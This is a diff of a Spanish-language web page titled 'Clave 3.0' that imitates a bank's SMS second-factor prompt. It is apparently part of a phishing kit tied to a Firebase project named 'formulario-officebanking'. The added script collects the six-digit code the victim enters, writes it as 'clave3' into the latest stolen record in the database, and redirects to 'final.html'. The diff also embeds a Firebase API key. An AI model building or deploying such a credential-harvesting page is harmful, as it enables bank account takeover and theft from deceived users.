@@ -5,50 +5,111 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Clave 3.0</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #ffffff;
-      padding: 2rem;
+      background: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: center;
+      padding: 2rem;
     }
-
     h2 {
-      color: #000;
+      color: black;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    .input-group {
+      display: flex;
+      gap: 0.5rem;
       margin-bottom: 1.5rem;
     }
-
-    .input-area {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    input[type="text"] {
-      font-size: 28px;
-      text-align: center;
-      letter-spacing: 12px;
-      border: 2px solid #000;
-      border-radius: 8px;
-      padding: 10px;
-      width: 220px;
-    }
-
-    .guiones {
-      margin-top: 0.5rem;
+    .input-group input {
+      width: 40px;
+      height: 40px;
       font-size: 20px;
-      letter-spacing: 32px;
-      color: #aaa;
+      text-align: center;
+      border: 1px solid #000;
+      border-radius: 5px;
+    }
+    .guiones {
+      display: flex;
+      gap: 0.5rem;
+      margin-top: -1rem;
+      margin-bottom: 1.5rem;
+      justify-content: center;
+    }
+    .guiones span {
+      width: 40px;
+      text-align: center;
+      color: gray;
+    }
+    button {
+      padding: 10px 20px;
+      background: red;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <h2>Ingresa Clave 3.0 enviada como SMS</h2>
-  <div class="input-area">
-    <input type="text" maxlength="6" />
-    <div class="guiones">_ _ _ _ _ _</div>
+  <div class="input-group" id="claveInputs">
+    <input maxlength="1" type="text" />
+    <input maxlength="1" type="text" />
+    <input maxlength="1" type="text" />
+    <input maxlength="1" type="text" />
+    <input maxlength="1" type="text" />
+    <input maxlength="1" type="text" />
   </div>
+  <div class="guiones">
+    <span>_</span><span>_</span><span>_</span><span>_</span><span>_</span><span>_</span>
+  </div>
+  <button onclick="enviar()">Enviar</button>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Input auto-avance
+    document.querySelectorAll('#claveInputs input').forEach((input, idx, arr) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && idx < arr.length - 1) {
+          arr[idx + 1].focus();
+        }
+      });
+    });
+
+    function enviar() {
+      const inputs = document.querySelectorAll('#claveInputs input');
+      const clave = Array.from(inputs).map(i => i.value).join('');
+      if (clave.length !== 6 || !/^[0-9]+$/.test(clave)) {
+        alert("Debe ingresar 6 dígitos numéricos.");
+        return;
+      }
+
+      // Guardar en la última entrada
+      db.ref("registros").limitToLast(1).once("value", snap => {
+        const key = Object.keys(snap.val() || {})[0];
+        if (key) {
+          db.ref("registros/" + key + "/clave3").set(clave);
+        }
+      });
+
+      window.location.href = "final.html";
+    }
+  </script>
 </body>
 </html>
